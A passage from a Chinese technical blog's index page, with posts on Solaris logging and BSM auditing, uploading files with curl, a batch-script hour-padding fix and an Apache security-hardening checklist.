</code></pre><p>  （把日志记录在/export/home/wangyu/log文件中，中间不是空格，是Tab）<br>  重新启动syslog守护进程<br>  当telnet上去的时候，我们看到/export/home/wangyu/log中有：  </p>
<pre><code>Sep 11 10:07:25 hlstar login: [ID 254462 auth.notice] ROOT LOGIN /dev/pts/1     FROM 192.168.0.9  
</code></pre></li>
<li>8.3     Loghost<br> 编辑/etc/syslog.conf，语法： <pre><code>*.err;kern.debug;deamon.notice;mail.crit @loghost  
</code></pre>  （记录登录信息）<br>  重新启动syslog守护进程<br>  假设这次我们使用linux做日志主机：  <pre><code>[root@wangyu root]#/sbin/setup  
</code></pre>  打开配置界面–&gt;;firewall configuration–&gt;;custom–&gt;;other ports:  <pre><code>写入 syslog:udp  
</code></pre>  重新启动防火墙  <pre><code>/etc/init.d/iptables restart或者/etc/init.d/ipchains restart  
</code></pre>  设置loghost接收网络日志数据，修改/etc/sysconfig/syslog配置文件：  <pre><code>修改 SYSLOGD_OPTIONS=&quot;-m 0&quot; 为 SYSLOGD_OPTIONS=&quot;-r -m 0&quot;  
</code></pre>  重新启动syslog守护进程<br>  此时/var/log/messages最下端附近会看到类似下面的信息  <pre><code>Aug 11 21:20:30 logserver syslogd 1.3-3: restart. (remote reception)  
</code></pre>  当telnet上去的时候，我们看到/var/log/messages中有类似下面的信息：  <pre><code>Sep 5 11:08:31 mastadon login: [ID 507249 auth.notice] Login failure on /dev/pts/3 from 192.168.0.9, root  
</code></pre></li>
<li><p>8.4     记帐<br>  Solaris操作系统可以通过设置日志文件可以对每个用户的每一条命令进行纪录，这一功能默认是不开放的。</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> 运行/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">acct</span>/<span class="title">accton</span> [路径][文件名]  </span></span><br><span class="line">（如/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">acct</span>/<span class="title">accton</span> /<span class="title">export</span>/<span class="title">home</span>/<span class="title">wangyu</span>/<span class="title">test</span>，将日志记录到<span class="title">test</span>中）</span></span><br><span class="line"> 查看的时候将文件移动到/var/adm目录下，改名为pacct  </span><br><span class="line"> 执行查看命令lastcomm（比如查看用户root，用命令lastcomm root）</span><br></pre></td></tr></table></figure>
</li>
<li><p>8.5     BSM<br>  1) 开启BSM：  </p>
<pre><code># init 1 (重新引导或改变运行级别到单用户状态)  
# /etc/security/bsmconv (运行BSM初始化脚本，开启审计功能)  
# reboot (重新启动系统，或者Ctrl+D改变到多用户状态)  
</code></pre><p>  2) 关闭BSM审计功能：  </p>
<pre><code># init 1  
# /etc/security/bsmunconv  
# reboot  
</code></pre><p>  3) 配置文件的功能：<br>  BSM所有的配置文件都存放在/etc/security目录下( (4)代表详细信息察看man (4) :</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">audit_class</span><span class="params">(<span class="number">4</span>)</span></span>  </span><br><span class="line">审计类别定义  </span><br><span class="line"><span class="function"><span class="title">audit_control</span><span class="params">(<span class="number">4</span>)</span></span>  </span><br><span class="line">审计进程控制信息  </span><br><span class="line"><span class="function"><span class="title">audit_data</span><span class="params">(<span class="number">4</span>)</span></span>  </span><br><span class="line">审计进程当前信息  </span><br><span class="line">audit.<span class="function"><span class="title">log</span><span class="params">(<span class="number">4</span>)</span></span>审计日志格式  </span><br><span class="line"><span class="function"><span class="title">audit_event</span><span class="params">(<span class="number">4</span>)</span></span>  </span><br><span class="line">时间定义到类别的映射文件  </span><br><span class="line"><span class="function"><span class="title">audit_user</span><span class="params">(<span class="number">4</span>)</span></span>  </span><br><span class="line">按用户审计时的用户定义文件  </span><br><span class="line">除了上面的配置文件之外，系统中还有一些用于BSM管理的脚本。  </span><br><span class="line"><span class="function"><span class="title">audit_startup</span><span class="params">(<span class="number">1</span>M)</span></span>  </span><br><span class="line">启动BSM进程运行。  </span><br><span class="line"><span class="function"><span class="title">auditconfig</span><span class="params">(<span class="number">1</span>M)</span></span>  </span><br><span class="line">读取配置文件，重新配置audit进程。  </span><br><span class="line"><span class="function"><span class="title">auditd</span><span class="params">(<span class="number">1</span>M)</span></span>  </span><br><span class="line">审计监控服务。  </span><br><span class="line"><span class="function"><span class="title">auditreduce</span><span class="params">(<span class="number">1</span>M)</span></span>  </span><br><span class="line">审计事件日志管理，可以调整日志格式，生成时间周期等信息。  </span><br><span class="line"><span class="function"><span class="title">auditstat</span><span class="params">(<span class="number">1</span>M)</span></span>  </span><br><span class="line">先是内核审计进程状态。  </span><br><span class="line"><span class="function"><span class="title">bsmconv</span><span class="params">(<span class="number">1</span>M)</span></span>  </span><br><span class="line">开启BSM功能。  </span><br><span class="line"><span class="function"><span class="title">bsmunconv</span><span class="params">(<span class="number">1</span>M)</span></span>  </span><br><span class="line">关闭BSM功能。  </span><br><span class="line"><span class="function"><span class="title">praudit</span><span class="params">(<span class="number">1</span>M)</span></span>  </span><br><span class="line">打印BSM审计日志内容。</span><br></pre></td></tr></table></figure>
<p>  4) BSM应用<br>  在默认配置情况下，BSM每天(24小时)会生成一个以当天日期为名字的审计日志，存放在    /var/audit目录下，这个文件具有自己的数据结构，所以直接查看时是乱码，必须使用系统命令 praudit来查看。  </p>
<pre><code># praudit /var/audit/xxxxxx.xxxxxx.log  
</code></pre><p>  另一个可能用到的命令是auditreduce ，这个命令允许管理员对审计日志做一些设置，例如调整审计事件集或调整审计日志生成周期等等。auditreduce和praudit是系统中BSM管理最基本的两个命令，组合起来可以完成相当多的功能：<br>  用管道联合两个命令，会显示系统中所有的历史审计事件。  </p>
<pre><code># auditreduce | praudit  
</code></pre><p>  再加上lp，将把所有审计事件直接打印出来。</p>
<pre><code># auditreduce | praudit | lp  
</code></pre><p>  如果系统中有相当多的审计信息的话，查找将是非常困难的事情，这条命令可以按照yymmdd的时间格式显示目标时间段内的审计事件，范例为显示April 13, 1990, 用户fred的登录类别审计事件集。  </p>
<pre><code># auditreduce -d 900413 -u fred -c lo | praudit  
</code></pre><p>  过滤目标时间所有的登录日志信息(Class:lo)，并且输出到一个单独的日志文件中：  </p>
<pre><code># auditreduce -c lo -d 870413 -O /usr/audit_summary/logins  
</code></pre><p>  auditreduce的 -b 和 -a 选项允许用户按照 yyyymmdd00:00:00 的时间格式制定一个时间段(Before &amp; After)。  </p>
<pre><code># auditreduce -a 91071500:00:00 | praudit  
# auditreduce -b 91071500:00:00 | praudit  
</code></pre><p>  5) 管理工具：<br>  eXpert-BSMTM<br>  一个很强大的商业BSM分析工具，不过目前也可以免费使用，支持Solaris 7/8 (Sparc|Intel)平台，可以在下面地址下载。<br><a href="http://www.sdl.sri.com/projects/emerald/releases/eXpert-BSM/download.html" target="_blank" rel="external">http://www.sdl.sri.com/projects/emerald/releases/eXpert-BSM/download.html</a><br>  Sun WBEM<br>  Solaris内置的图形界面管理工具，也就是AdminConsole，在WBEM 2.3之后的版本支持对BSM信息的管理。可以用下面命令开启：  </p>
<pre><code># /usr/sadm/bin/wbemadmin (第一次运行时会安装一系列的管理脚本)  
# /usr/sadm/bin/smc (开启管理终端)  
</code></pre><p>  以上，对Solaris审计系统进行了配置，相信大部分用户行为和入侵行为都被记录下来了，并且对日志自身也进行了一定保护。如果管理员能及时分析日志，相信可以捕获大部分入侵企图和行为。</p>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/01/05/solaris/" data-id="cin5pv3460007hcfwdgggr6ld" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-curl" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/01/04/curl/" class="article-date">
  <time datetime="2016-01-04T08:27:17.000Z" itemprop="datePublished">2016-01-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/01/04/curl/">使用curl进行文件上传</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>最近测试文件上传功能，手工上传太麻烦，就想有没有比较简单的方法，<br>发现curl竟然提供了通过post上传文件的功能</p>
<h2 id="u201Ccurl_-d_URL_u201D"><a href="#u201Ccurl_-d_URL_u201D" class="headerlink" title="“curl -d URL”"></a>“curl -d URL” </h2><p>可以向URL发送post请求参数</p>
<p>-F 功能则可以post请求上传文件<br>使用curl <wbr>通过post <wbr>向HTTP上传文件直接贴代码 </p>
<h2 id="curl_-F_file_3D@1-txt_submit_3DSubmit_URL"><a href="#curl_-F_file_3D@1-txt_submit_3DSubmit_URL" class="headerlink" title="curl -F file=@1.txt submit=Submit URL"></a>curl -F file=@1.txt submit=Submit URL</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/01/04/curl/" data-id="cin5pv34g0009hcfww1qs0kne" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-cmdtime" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/01/04/cmdtime/" class="article-date">
  <time datetime="2016-01-04T08:25:40.000Z" itemprop="datePublished">2016-01-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/01/04/cmdtime/">批处理脚本解决0点问题</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>最近用批处理按照日期和小时生成文件夹进行每小时的工作统计，遇到过23点后文件夹无法生成。经过网上查找资料 原来</p>
<p>是10点之前的小时数为单个，在过完23点后无法生成00。解决过程如下:<br>批处理获取当前时间对10点之前获取小时进行补0，<br>set hh=%time:~0,2%<br>if /i %hh% LSS 10 (set hh=0%time:~1,1%)<br>set AFile=Web_%date:~5,2%%date:~8,2%%hh%<br>rd %AFile% 2&gt;nul<br>mkdir %AFile%<br>生成文件夹10点之前的即为 061809</p>
<p>AFile即为要生成的时间</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/01/04/cmdtime/" data-id="cin5pv34j000ahcfwgrxdrr3a" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-apache" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/12/31/apache/" class="article-date">
  <time datetime="2015-12-31T02:35:31.000Z" itemprop="datePublished">2015-12-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/31/apache/">apache安全加固</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="u4E00-_u8D26_u53F7_u8BBE_u7F6E"><a href="#u4E00-_u8D26_u53F7_u8BBE_u7F6E" class="headerlink" title="一.账号设置"></a>一.账号设置</h1><p>以专门的用户帐号和组运行 Apache。</p>
<p>1、根据需要为 Apache 创建用户、组</p>
<p>2、参考配置操作 如果没有设置用户和组，则新建用户，并在 Apache 配置文件中指定</p>
<p>(1) 创建 apache 组：groupadd apache</p>
<p>(2) 创建 apache 用户并加入 apache 组：useradd apache –g apache</p>
<p>(3) 将下面两行加入 Apache 配置文件 httpd.conf 中</p>
<p>User apache</p>
<p>Group apache</p>
<p>3、检查 httpd.conf 配置文件。 检查是否使用非专用账户（如 root）运行 apache</p>
<p>默认一般符合要求，linux下默认apache或者nobody用户，Unix默认为daemon用户</p>
<h1 id="u4E8C-_u6388_u6743_u8BBE_u7F6E"><a href="#u4E8C-_u6388_u6743_u8BBE_u7F6E" class="headerlink" title="二.授权设置"></a>二.授权设置</h1><p>严格控制Apache主目录的访问权限，非超级用户不能修改该目录中的内容</p>
<p>1、Apache 的 主目录对应 于 Apache Server</p>
<p>配置文件 httpd.conf 的</p>
<p>Server Root控制项中，</p>
<p>应为：</p>
<p>Server Root /usr/local/apache”</p>
<p>2、判定条件</p>
<p>非超级用户不能修改该目录中的内容</p>
<p>3、检测操作</p>
<p>尝试修改，看是否能修改</p>
<p>4、一般为/etc/httpd目录，默认情况下属主为root:root，其它用户不能修改文件，默认一般符合要求</p>
<p>严格设置配置文件和日志文件的权限，防止未授权访问</p>
<p>1、chmod 600 /etc/httpd/conf/httpd.conf”设置配置文件为属主可读写，其他用户无权限。</p>
<p>2、使用命令”chmod 644 /var/log/httpd/*.log”设置日志文件为属主可读写，其他用户只读权限。</p>
<p>3、/etc/httpd/conf/httpd.conf默认权限是644，可根据需要修改权限为600。</p>
<p>4、/var/log/httpd/*.log默认权限为644，默认一般符合要求。</p>
<h1 id="u4E09-_u65E5_u5FD7_u8BBE_u7F6E"><a href="#u4E09-_u65E5_u5FD7_u8BBE_u7F6E" class="headerlink" title="三.日志设置"></a>三.日志设置</h1><p>设备应配置日志功能，对运行错误、用户访问等进行记录，记录</p>
<p>内容包括时间，用户使用的 IP 地址等内容。</p>
<p>1、编辑 httpd.conf 配置文件，设置日志记录文件、记录内容、记录 格式。</p>
<p>其中，错误日志：</p>
<p>LogLevel notice #日志的级别</p>
<p>ErrorLog /…/logs/error_log #日志的保存位置（错误日志）</p>
<p>访问日志：</p>
<p>LogFormat %h %l %u %t \”%r\” %&gt;s %b “%{Accept}i\”%{Referer}i\” \”%{User-Agent}i\””</p>
<p>combined</p>
<p>CustomLog /…/logs/access_log combined （访问日志）</p>
<p>ErrorLog 指令设置错误日志文件名和位置。错误日志是最重要的 日志文件，</p>
<p>Apache httpd 将在这个文件中存放诊断信息和处理请 求中出现的错误。</p>
<p>若要将错误日志送到 Syslog，则设置： ErrorLog syslog。</p>
<p>CustomLog 指令指定了保存日志文件的具体位置以及日志的格式。访问日志中会记录服务器所处理的所有请求。</p>
<p>LogFormat 设置日志格式，建议设置为 combined 格式。</p>
<p>LogLevel 用于调整记录在错误日志中的信息的详细程度，建议设置为notice。</p>
<p>日志的级别，默认是warn，notice级别比较详细，在实际中由于日志会占用大量硬盘空间，一般没有设置</p>
<h1 id="u56DB-_u7981_u6B62_u8BBF_u95EE_u5916_u90E8_u6587_u4EF6"><a href="#u56DB-_u7981_u6B62_u8BBF_u95EE_u5916_u90E8_u6587_u4EF6" class="headerlink" title="四.禁止访问外部文件"></a>四.禁止访问外部文件</h1><p>禁止 Apache 访问 Web 目录之外的任何文件。</p>
<p>1、参考配置操作</p>
<p>编辑 httpd.conf 配置文件，</p>
<p>Order Deny,Allow</p>
<p>Deny from all</p>
<p>2、设置可访问目录，</p>
<p>Order Allow,Deny</p>
<p>Allow from all</p>
<p>其中/web 为网站根目录</p>
<p>3、默认配置是</p>
<p>Options FollowSymLinks</p>
<p>AllowOverride None</p>
<p>一般可根据需要设置</p>
<h1 id="u4E94-_u76EE_u5F55_u5217_u51FA"><a href="#u4E94-_u76EE_u5F55_u5217_u51FA" class="headerlink" title="五.目录列出"></a>五.目录列出</h1><p>禁止 Apache 列表显示文件<br>编辑 httpd.conf 配置文件。</p>
<p>Options Indexes FollowSymLinks #删掉</p>
<p>Indexes</p>
<p>AllowOverride None</p>
<p>Order allow,deny</p>
<p>Allow from all</p>
<p>将Options Indexes FollowSymLinks 中的 Indexes 去掉，就可以禁 止 Apache 显示该目录结构。</p>
<p>Indexes 的作用就是当该目录下没 有 index.html 文件时，就显示目录结构。</p>
<p>2、重新启动 Apache 服务</p>
<p>3、可以设置 /etc/httpd/httpd.conf 段中删除Options的Indexes设置 一般可根据需要设置</p>
<h1 id="u516D-_u9519_u8BEF_u9875_u9762_u91CD_u5B9A_u5411"><a href="#u516D-_u9519_u8BEF_u9875_u9762_u91CD_u5B9A_u5411" class="headerlink" title="六.错误页面重定向"></a>六.错误页面重定向</h1><p>Apache 错误页面重定向</p>
<p>1、修改 httpd.conf 配置文件：</p>
<p>ErrorDocument 400 /custom400.html</p>
<p>ErrorDocument 401 /custom401.html</p>
<p>ErrorDocument 403 /custom403.html</p>
<p>ErrorDocument 404 /custom404.html</p>
<p>ErrorDocument 405 /custom405.html</p>
<p>ErrorDocument 500 /custom500.html Customxxx.html 为要设置的错误页面。</p>
<p>2、重新启动 Apache 服务</p>
<p>3、此项需要应用系统设有错误页面，或者不在httpd中设置完全由业务逻辑实现，可不做</p>
<h1 id="u4E03-_u62D2_u7EDD_u670D_u52A1_u9632_u8303"><a href="#u4E03-_u62D2_u7EDD_u670D_u52A1_u9632_u8303" class="headerlink" title="七.拒绝服务防范"></a>七.拒绝服务防范</h1><p>根据业务需要，合理设置 session 时间，防止拒绝服务攻击<br>1、编辑 httpd.conf 配置文件，</p>
<p>Timeout 10 #客户端与服务器端建立连接前的时间间隔</p>
<p>KeepAlive On<br>KeepAliveTimeout 15 #限制每个 session 的保持时间是 15 秒 注：此处为一建议值，具体的设定需要根据现实情况。<br>2、重新启动 Apache 服务</p>
<p>3、默认Timeout 120 KeepAlive Off，KeepAliveTimeout 15，该项设置涉及性能调整，一般不做。</p>
<h1 id="u516B-_u9690_u85CF_Apache__u7684_u7248_u672C_u53F7"><a href="#u516B-_u9690_u85CF_Apache__u7684_u7248_u672C_u53F7" class="headerlink" title="八.隐藏 Apache 的版本号"></a>八.隐藏 Apache 的版本号</h1><p>隐藏 Apache 的版本号及其它敏感信息。</p>
<p>1、配置操作</p>
<p>修改 httpd.conf 配置文件： ServerSignature Off ServerTokens Prod</p>
<p>2、默认是 ServerSignature On，ServerTokens OS，可以设置</p>
<h1 id="u4E5D-_u5173_u95ED_TRACE"><a href="#u4E5D-_u5173_u95ED_TRACE" class="headerlink" title="九.关闭 TRACE"></a>九.关闭 TRACE</h1><p>关闭 TRACE，防止 TRACE 方法被访问者恶意利用</p>
<p>1、 配置修改vim /etc/httpd/conf/httpd.conf</p>
<p>添加 “TraceEnable Off”</p>
<p>注：适用于 Apache 2.0 以上版本</p>
<p>2、默认没有该项设置，可以做。</p>
<h1 id="u5341-_u7981_u7528_CGI"><a href="#u5341-_u7981_u7528_CGI" class="headerlink" title="十.禁用 CGI"></a>十.禁用 CGI</h1><p>如果服务器上不需要运行 CGI 程序，建议禁用 CGI</p>
<p>1、 修改配置vim /etc/httpd/conf/httpd.conf</p>
<p>把 cgi-bin 目录的配置和模块都注释掉</p>
<p>#LoadModule cgi_module modules/mod_cgi.so</p>
<p>#ScriptAlias /cgi-bin/ “/var/www/cgi-bin/”</p>
<p>#</p>
<p>#AllowOverride None</p>
<p>#Options None</p>
<p>#Order allow,deny</p>
<p>#Allow from all</p>
<p>2、 根据需要设置，如果没有CGI程序，可以关闭</p>
<h1 id="u5341_u4E00-_u76D1_u542C_u5730_u5740_u7ED1_u5B9A"><a href="#u5341_u4E00-_u76D1_u542C_u5730_u5740_u7ED1_u5B9A" class="headerlink" title="十一.监听地址绑定"></a>十一.监听地址绑定</h1><p>服务器有多个 IP 地址时，只监听提供服务的 IP 地址</p>
<p>1、 修改配置vim /etc/httpd/conf/httpd.con</p>
<p>修改</p>
<p>Listen x.x.x.x:80</p>
<p>2、检测操作</p>
<p>使用命令”cat /etc/httpd/conf/httpd.conf|grep Listen”查看是否 绑定 IP 地址</p>
<p>3、默认设置是Listen 80监听所有地址，如果服务器只有一个IP地址可不做该项设置，如果有多个IP可以按照需要设。</p>
<h1 id="u5341_u4E8C-_u5220_u9664_u7F3A_u7701_u5B89_u88C5_u7684_u65E0_u7528_u6587_u4EF6"><a href="#u5341_u4E8C-_u5220_u9664_u7F3A_u7701_u5B89_u88C5_u7684_u65E0_u7528_u6587_u4EF6" class="headerlink" title="十二.删除缺省安装的无用文件"></a>十二.删除缺省安装的无用文件</h1><p>删除缺省安装的无用文件。</p>
<p>1、参考配置操作删除缺省 HTML 文件：</p>
<p>#rm -rf /usr/local/apache2/htdocs/*</p>
<p>删除缺省的 CGI 脚本：</p>
<p>#rm –rf /usr/local/apache2/cgi-bin/*</p>
<p>删除 Apache 说明文件：</p>
<p>#rm –rf /usr/local/apache2/manual</p>
<p>删除源代码文件：</p>
<p>#rm -rf /path/to/httpd-2.2.4* 根据安装步骤不同和版本不同，某些目录或文件可能不存在或位置不同。</p>
<p>2、可根据实际情况删除，一般是 /var/www/html /var/www/cgi-bin 默认就是空的</p>
<h1 id="u5341_u4E09-_u7981_u7528_u975E_u6CD5_HTTP__u65B9_u6CD5"><a href="#u5341_u4E09-_u7981_u7528_u975E_u6CD5_HTTP__u65B9_u6CD5" class="headerlink" title="十三.禁用非法 HTTP 方法"></a>十三.禁用非法 HTTP 方法</h1><p>禁用PUT、DELETE等危险的HTTP 方法；</p>
<p>1、 编辑 httpd.conf 文件。</p>
<p>只允许 get、post 方法</p>
<p>Deny from all</p>
<p>2、检测操作</p>
<p>查看 httpd.conf 文件，</p>
<p>检查如下内容，是否只允许 get、post</p>
<p>方法</p>
<p>Deny from all</p>
<p>3、根据需要可设置，如果没有不需要用到put delete HTTP 方法的话，</p>
<p>加在/etc/httpd/conf/httpd.conf的段中。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2015/12/31/apache/" data-id="cin5pv34m000bhcfw9fho4lqo" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/12/25/hello-world/" class="article-date">
  <time datetime="2015-12-25T08:56:16.542Z" itemprop="datePublished">2015-12-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/25/hello-world/">欢迎来到博客</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>欢迎来到oneplusone的博客<br>好好努力，加油哦！少年！记得好好整理博客！<br>写博客一是为了给自己以前的工作做一个总结;<br>二是告诫自己忽忘初心，静下心来，安安静静的写点东西;<br>三是给未来的自己留下点值得回忆的岁月;<br>若有不当之处，定当改过！</p>
<blockquote>
<pre><code>写给自己
</code></pre></blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2015/12/25/hello-world/" data-id="cin5pv34c0008hcfw7sixq74s" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  
</section>
        
          <aside id="sidebar">
  
    
  
    
  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a><span class="archive-list-count">4</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recents</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2016/04/18/手工注入/">MSSQL、MySQL、Oracle 手工注入</a>
          </li>
        
          <li>
            <a href="/2016/04/18/yewuluoji/">渗透项目常见漏洞</a>
          </li>
        
          <li>
            <a href="/2016/04/18/tiquan/">系统提权</a>
          </li>
        
          <li>
            <a href="/2016/03/20/移动应用渗透测试备忘单(二)/">移动应用渗透测试备忘单(二)</a>
          </li>
        
          <li>
            <a href="/2016/03/02/移动应用渗透测试备忘单(一)/">移动应用渗透测试备忘单(一)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2016 oneplusone<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>


<script src="/js/script.js" type="text/javascript"></script>

  </div>
</body>
</html>